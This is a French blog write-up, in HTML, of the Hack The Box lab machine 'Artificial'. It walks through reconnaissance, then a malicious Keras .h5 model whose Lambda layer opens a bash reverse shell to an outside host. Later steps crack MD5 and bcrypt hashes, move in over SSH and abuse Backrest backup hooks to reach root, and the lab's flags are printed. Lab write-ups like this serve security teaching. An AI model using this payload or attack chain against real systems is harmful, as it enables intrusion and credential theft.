<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Hack The Box Artificial | Wanako Blog</title><meta name=keywords content="Hack The Box"><meta name=description content="Write Up du challenge Artificial"><meta name=author content="Wanako Kanan"><link rel=canonical href=http://localhost:1313/posts/artificial/><link crossorigin=anonymous href=/assets/css/stylesheet.2211ca3164be7830024f6aad2b3a2e520843a64f8f048445c3401c1249aa051d.css integrity="sha256-IhHKMWS+eDACT2qtKzouUghDpk+PBIRFw0AcEkmqBR0=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/img/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/img/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/img/favicon-32x32.png><link rel=apple-touch-icon href=http://localhost:1313/img/apple-touch-icon.png><link rel=mask-icon href=http://localhost:1313/img/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/artificial/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="http://localhost:1313/posts/artificial/"><meta property="og:site_name" content="Wanako Blog"><meta property="og:title" content="Hack The Box Artificial"><meta property="og:description" content="Write Up du challenge Artificial"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-10-07T15:00:00+02:00"><meta property="article:modified_time" content="2025-10-07T15:00:00+02:00"><meta property="article:tag" content="Hack the Box"><meta property="og:image" content="http://localhost:1313/images/avatar.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://localhost:1313/images/avatar.png"><meta name=twitter:title content="Hack The Box Artificial"><meta name=twitter:description content="Write Up du challenge Artificial"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://localhost:1313/posts/"},{"@type":"ListItem","position":2,"name":"Hack The Box Artificial","item":"http://localhost:1313/posts/artificial/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Hack The Box Artificial","name":"Hack The Box Artificial","description":"Write Up du challenge Artificial","keywords":["Hack The Box"],"articleBody":"WriteUp - Artificial Reconnaissance nmap -A [IP] Ports ouverts :\n22/tcp : SSH (OpenSSH 8.2p1) 80/tcp : HTTP (nginx 1.18.0) → Redirection vers http://artificial.htb/ Enumération web :\ngobuster dir -w directory-list-2.3-small.txt -u http://artificial.htb/ -x php,html,js Pages découvertes :\n/login (200) /register (200) /logout (302) /dashboard (302 → /login) Exploitation - Upload de modèle malveillant (.h5) 1. Analyse de la fonctionnalité Après création d’un compte, la plateforme permet l’upload de fichiers .h5 (modèles Keras/TensorFlow).\n2. Création du payload malveillant Script Python d’exploitation :\nimport tensorflow as tf model = tf.keras.Sequential([ tf.keras.layers.Input(shape=(10,)), tf.keras.layers.Lambda(lambda x: __import__('os').system( 'bash -c \"bash -i \u003e\u0026 /dev/tcp/10.10.14.115/4444 0\u003e\u00261\"' )) ]) model.save('exploit.h5') Vulnérabilité exploitée :\nCVE-2023-33976 : TensorFlow \u003c 2.14 exécute du code arbitraire lors de la désérialisation de Lambda layers Pas de sanitization lors du load_model() Build du modèle :\ndocker build -t tf-exploit . docker run -it -v $(pwd):/code tf-exploit python3 create_exploit.py 3. Obtention du shell Listener :\nnc -lvnp 4444 Upload de exploit.h5 → Shell reçu en tant qu’utilisateur app\nEscalade de privilèges #1 - Utilisateur gael 1. Extraction des credentials cat instance/users.db Hash MD5 de gael :\nc99175974b6e192936d97224638a34f8 Crackage via CrackStation :\nc99175974b6e192936d97224638a34f8 → mattp005numbertwo 2. Connexion SSH ssh gael@10.10.11.74 # Password: mattp005numbertwo Vérification des groupes :\nid # uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm) Escalade de privilèges #2 - Root via Backrest 1. Recherche de fichiers accessibles au groupe sysadm find / -group sysadm 2\u003e/dev/null # /var/backups/backrest_backup.tar.gz 2. Extraction du backup cp /var/backups/backrest_backup.tar.gz /tmp/ cd /tmp tar xvf backrest_backup.tar.gz Contenu découvert :\n{ \"name\": \"backrest_root\", \"passwordBcrypt\": \"JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP\" } 3. Crackage du hash bcrypt echo \"JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP\" | base64 -d # $2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO hashcat -m 3200 hash.txt rockyou.txt --force # Password: !@#$%^ 4. Port Forwarding vers Backrest (port 9898) ssh -L 9898:127.0.0.1:9898 gael@10.10.11.74 Accès à l’interface Backrest via http://localhost:9898\n5. Exploitation de Backrest pour Command Injection Étapes :\nCréer un nouveau Repository Restic\nPath: /tmp Ajouter un Hook\nCommand: cat /root/root.txt Type: After Backup Créer un Plan de Backup\nRepository: celui créé précédemment Path: /root Exécuter le Backup\nCliquer sur “Backup Now” Récupérer le flag\nConsulter “Hook Output” : 1f0414629075d2d1373c2db0aea61ca3 Résumé de la chaîne d’exploitation 1. Upload .h5 malveillant (RCE via Lambda layer) ↓ 2. Shell en tant que 'app' ↓ 3. Extraction de users.db → Hash MD5 de gael ↓ 4. Crack du hash → SSH avec gael ↓ 5. Groupe sysadm → Accès à backup Backrest ↓ 6. Crack du bcrypt → Credentials admin Backrest ↓ 7. Port forwarding + Command Injection via Hooks ↓ 8. Root flag: 1f0414629075d2d1373c2db0aea61ca3 Points clés CVE TensorFlow : Désérialisation non sécurisée de Lambda layers Credential reuse : Hash faibles (MD5, bcrypt avec rockyou) Privilege Escalation : Exploitation de groupes Unix (sysadm) Pivoting : Port forwarding SSH pour accéder à un service interne Command Injection : Abus de fonctionnalité légitime (Hooks de backup) ","wordCount":"460","inLanguage":"en","image":"http://localhost:1313/images/avatar.png","datePublished":"2025-10-07T15:00:00+02:00","dateModified":"2025-10-07T15:00:00+02:00","author":{"@type":"Person","name":"Wanako Kanan"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/posts/artificial/"},"publisher":{"@type":"Organization","name":"Wanako Blog","logo":{"@type":"ImageObject","url":"http://localhost:1313/img/favicon-32x32.png"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Wanako Blog (Alt + H)"><img src=http://localhost:1313/images/avatar.png alt aria-label=logo height=35>Wanako Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/posts/ title=Blog><span>Blog</span></a></li><li><a href=http://localhost:1313/projets/ title=Projets><span>Projets</span></a></li><li><a href=http://localhost:1313/contact/ title=Contact><span>Contact</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">Hack The Box Artificial
<span class=entry-hint title=Draft><svg height="35" viewBox="0 -960 960 960" fill="currentColor"><path d="M160-410v-60h3e2v60H160zm0-165v-60h470v60H160zm0-165v-60h470v60H160zm360 580v-123l221-220q9-9 20-13t22-4q12 0 23 4.5t20 13.5l37 37q9 9 13 20t4 22-4.5 22.5T862.09-380L643-160H520zm3e2-263-37-37 37 37zM580-220h38l121-122-18-19-19-18-122 121v38zm141-141-19-18 37 37-18-19z"/></svg></span></h1><div class=post-description>Write Up du challenge Artificial</div><div class=post-meta><span title='2025-10-07 15:00:00 +0200 CEST'>7 October 2025</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;460 words&nbsp;·&nbsp;Wanako Kanan</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#reconnaissance>Reconnaissance</a></li><li><a href=#exploitation---upload-de-modèle-malveillant-h5>Exploitation - Upload de modèle malveillant (.h5)</a><ul><li><a href=#1-analyse-de-la-fonctionnalité>1. Analyse de la fonctionnalité</a></li><li><a href=#2-création-du-payload-malveillant>2. Création du payload malveillant</a></li><li><a href=#3-obtention-du-shell>3. Obtention du shell</a></li></ul></li><li><a href=#escalade-de-privilèges-1---utilisateur-gael>Escalade de privilèges #1 - Utilisateur gael</a><ul><li><a href=#1-extraction-des-credentials>1. Extraction des credentials</a></li><li><a href=#2-connexion-ssh>2. Connexion SSH</a></li></ul></li><li><a href=#escalade-de-privilèges-2---root-via-backrest>Escalade de privilèges #2 - Root via Backrest</a><ul><li><a href=#1-recherche-de-fichiers-accessibles-au-groupe-sysadm>1. Recherche de fichiers accessibles au groupe sysadm</a></li><li><a href=#2-extraction-du-backup>2. Extraction du backup</a></li><li><a href=#3-crackage-du-hash-bcrypt>3. Crackage du hash bcrypt</a></li><li><a href=#4-port-forwarding-vers-backrest-port-9898>4. Port Forwarding vers Backrest (port 9898)</a></li><li><a href=#5-exploitation-de-backrest-pour-command-injection>5. Exploitation de Backrest pour Command Injection</a></li></ul></li><li><a href=#résumé-de-la-chaîne-dexploitation>Résumé de la chaîne d&rsquo;exploitation</a></li><li><a href=#points-clés>Points clés</a></li></ul></nav></div></details></div><div class=post-content><h1 id=writeup---artificial>WriteUp - Artificial<a hidden class=anchor aria-hidden=true href=#writeup---artificial>#</a></h1><h2 id=reconnaissance>Reconnaissance<a hidden class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nmap -A <span class=o>[</span>IP<span class=o>]</span>
</span></span></code></pre></div><p><strong>Ports ouverts :</strong></p><ul><li><strong>22/tcp</strong> : SSH (OpenSSH 8.2p1)</li><li><strong>80/tcp</strong> : HTTP (nginx 1.18.0) → Redirection vers <code>http://artificial.htb/</code></li></ul><p><strong>Enumération web :</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gobuster dir -w directory-list-2.3-small.txt -u http://artificial.htb/ -x php,html,js
</span></span></code></pre></div><p><strong>Pages découvertes :</strong></p><ul><li><code>/login</code> (200)</li><li><code>/register</code> (200)</li><li><code>/logout</code> (302)</li><li><code>/dashboard</code> (302 → /login)</li></ul><hr><h2 id=exploitation---upload-de-modèle-malveillant-h5>Exploitation - Upload de modèle malveillant (.h5)<a hidden class=anchor aria-hidden=true href=#exploitation---upload-de-modèle-malveillant-h5>#</a></h2><h3 id=1-analyse-de-la-fonctionnalité>1. Analyse de la fonctionnalité<a hidden class=anchor aria-hidden=true href=#1-analyse-de-la-fonctionnalité>#</a></h3><p>Après création d&rsquo;un compte, la plateforme permet l&rsquo;upload de fichiers <code>.h5</code> (modèles Keras/TensorFlow).</p><h3 id=2-création-du-payload-malveillant>2. Création du payload malveillant<a hidden class=anchor aria-hidden=true href=#2-création-du-payload-malveillant>#</a></h3><p><strong>Script Python d&rsquo;exploitation :</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>tensorflow</span> <span class=k>as</span> <span class=nn>tf</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>model</span> <span class=o>=</span> <span class=n>tf</span><span class=o>.</span><span class=n>keras</span><span class=o>.</span><span class=n>Sequential</span><span class=p>([</span>
</span></span><span class=line><span class=cl>    <span class=n>tf</span><span class=o>.</span><span class=n>keras</span><span class=o>.</span><span class=n>layers</span><span class=o>.</span><span class=n>Input</span><span class=p>(</span><span class=n>shape</span><span class=o>=</span><span class=p>(</span><span class=mi>10</span><span class=p>,)),</span>
</span></span><span class=line><span class=cl>    <span class=n>tf</span><span class=o>.</span><span class=n>keras</span><span class=o>.</span><span class=n>layers</span><span class=o>.</span><span class=n>Lambda</span><span class=p>(</span><span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=nb>__import__</span><span class=p>(</span><span class=s1>&#39;os&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>system</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.115/4444 0&gt;&amp;1&#34;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>model</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=s1>&#39;exploit.h5&#39;</span><span class=p>)</span>
</span></span></code></pre></div><p><strong>Vulnérabilité exploitée :</strong></p><ul><li><strong>CVE-2023-33976</strong> : TensorFlow &lt; 2.14 exécute du code arbitraire lors de la désérialisation de Lambda layers</li><li>Pas de sanitization lors du <code>load_model()</code></li></ul><p><strong>Build du modèle :</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>docker build -t tf-exploit .
</span></span><span class=line><span class=cl>docker run -it -v <span class=k>$(</span><span class=nb>pwd</span><span class=k>)</span>:/code tf-exploit
</span></span><span class=line><span class=cl>python3 create_exploit.py
</span></span></code></pre></div><h3 id=3-obtention-du-shell>3. Obtention du shell<a hidden class=anchor aria-hidden=true href=#3-obtention-du-shell>#</a></h3><p><strong>Listener :</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -lvnp <span class=m>4444</span>
</span></span></code></pre></div><p><strong>Upload de <code>exploit.h5</code></strong> → Shell reçu en tant qu&rsquo;utilisateur <code>app</code></p><hr><h2 id=escalade-de-privilèges-1---utilisateur-gael>Escalade de privilèges #1 - Utilisateur gael<a hidden class=anchor aria-hidden=true href=#escalade-de-privilèges-1---utilisateur-gael>#</a></h2><h3 id=1-extraction-des-credentials>1. Extraction des credentials<a hidden class=anchor aria-hidden=true href=#1-extraction-des-credentials>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat instance/users.db
</span></span></code></pre></div><p><strong>Hash MD5 de gael :</strong></p><pre tabindex=0><code>c99175974b6e192936d97224638a34f8
</code></pre><p><strong>Crackage via CrackStation :</strong></p><pre tabindex=0><code>c99175974b6e192936d97224638a34f8 → mattp005numbertwo
</code></pre><h3 id=2-connexion-ssh>2. Connexion SSH<a hidden class=anchor aria-hidden=true href=#2-connexion-ssh>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ssh gael@10.10.11.74
</span></span><span class=line><span class=cl><span class=c1># Password: mattp005numbertwo</span>
</span></span></code></pre></div><p><strong>Vérification des groupes :</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>id
</span></span><span class=line><span class=cl><span class=c1># uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)</span>
</span></span></code></pre></div><hr><h2 id=escalade-de-privilèges-2---root-via-backrest>Escalade de privilèges #2 - Root via Backrest<a hidden class=anchor aria-hidden=true href=#escalade-de-privilèges-2---root-via-backrest>#</a></h2><h3 id=1-recherche-de-fichiers-accessibles-au-groupe-sysadm>1. Recherche de fichiers accessibles au groupe sysadm<a hidden class=anchor aria-hidden=true href=#1-recherche-de-fichiers-accessibles-au-groupe-sysadm>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>find / -group sysadm 2&gt;/dev/null
</span></span><span class=line><span class=cl><span class=c1># /var/backups/backrest_backup.tar.gz</span>
</span></span></code></pre></div><h3 id=2-extraction-du-backup>2. Extraction du backup<a hidden class=anchor aria-hidden=true href=#2-extraction-du-backup>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cp /var/backups/backrest_backup.tar.gz /tmp/
</span></span><span class=line><span class=cl><span class=nb>cd</span> /tmp
</span></span><span class=line><span class=cl>tar xvf backrest_backup.tar.gz
</span></span></code></pre></div><p><strong>Contenu découvert :</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;backrest_root&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;passwordBcrypt&#34;</span><span class=p>:</span> <span class=s2>&#34;JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h3 id=3-crackage-du-hash-bcrypt>3. Crackage du hash bcrypt<a hidden class=anchor aria-hidden=true href=#3-crackage-du-hash-bcrypt>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP&#34;</span> <span class=p>|</span> base64 -d
</span></span><span class=line><span class=cl><span class=c1># $2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>hashcat -m <span class=m>3200</span> hash.txt rockyou.txt --force
</span></span><span class=line><span class=cl><span class=c1># Password: !@#$%^</span>
</span></span></code></pre></div><h3 id=4-port-forwarding-vers-backrest-port-9898>4. Port Forwarding vers Backrest (port 9898)<a hidden class=anchor aria-hidden=true href=#4-port-forwarding-vers-backrest-port-9898>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ssh -L 9898:127.0.0.1:9898 gael@10.10.11.74
</span></span></code></pre></div><p>Accès à l&rsquo;interface Backrest via <code>http://localhost:9898</code></p><h3 id=5-exploitation-de-backrest-pour-command-injection>5. Exploitation de Backrest pour Command Injection<a hidden class=anchor aria-hidden=true href=#5-exploitation-de-backrest-pour-command-injection>#</a></h3><p><strong>Étapes :</strong></p><ol><li><p><strong>Créer un nouveau Repository Restic</strong></p><ul><li>Path: <code>/tmp</code></li></ul></li><li><p><strong>Ajouter un Hook</strong></p><ul><li>Command: <code>cat /root/root.txt</code></li><li>Type: After Backup</li></ul></li><li><p><strong>Créer un Plan de Backup</strong></p><ul><li>Repository: celui créé précédemment</li><li>Path: <code>/root</code></li></ul></li><li><p><strong>Exécuter le Backup</strong></p><ul><li>Cliquer sur &ldquo;Backup Now&rdquo;</li></ul></li><li><p><strong>Récupérer le flag</strong></p><ul><li>Consulter &ldquo;Hook Output&rdquo; :</li></ul></li></ol><pre tabindex=0><code>1f0414629075d2d1373c2db0aea61ca3
</code></pre><hr><h2 id=résumé-de-la-chaîne-dexploitation>Résumé de la chaîne d&rsquo;exploitation<a hidden class=anchor aria-hidden=true href=#résumé-de-la-chaîne-dexploitation>#</a></h2><pre tabindex=0><code>1. Upload .h5 malveillant (RCE via Lambda layer)
   ↓
2. Shell en tant que &#39;app&#39;
   ↓
3. Extraction de users.db → Hash MD5 de gael
   ↓
4. Crack du hash → SSH avec gael
   ↓
5. Groupe sysadm → Accès à backup Backrest
   ↓
6. Crack du bcrypt → Credentials admin Backrest
   ↓
7. Port forwarding + Command Injection via Hooks
   ↓
8. Root flag: 1f0414629075d2d1373c2db0aea61ca3
</code></pre><hr><h2 id=points-clés>Points clés<a hidden class=anchor aria-hidden=true href=#points-clés>#</a></h2><ul><li><strong>CVE TensorFlow</strong> : Désérialisation non sécurisée de Lambda layers</li><li><strong>Credential reuse</strong> : Hash faibles (MD5, bcrypt avec rockyou)</li><li><strong>Privilege Escalation</strong> : Exploitation de groupes Unix (sysadm)</li><li><strong>Pivoting</strong> : Port forwarding SSH pour accéder à un service interne</li><li><strong>Command Injection</strong> : Abus de fonctionnalité légitime (Hooks de backup)</li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=http://localhost:1313/tags/hack-the-box/>Hack the Box</a></li></ul><nav class=paginav><a class=prev href=http://localhost:1313/posts/soulmate/><span class=title>« Prev</span><br><span>Hack The Box Soulmate</span>
</a><a class=next href=http://localhost:1313/posts/editor/><span class=title>Next »</span><br><span>Hack The Box Editor</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>Wanako Blog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>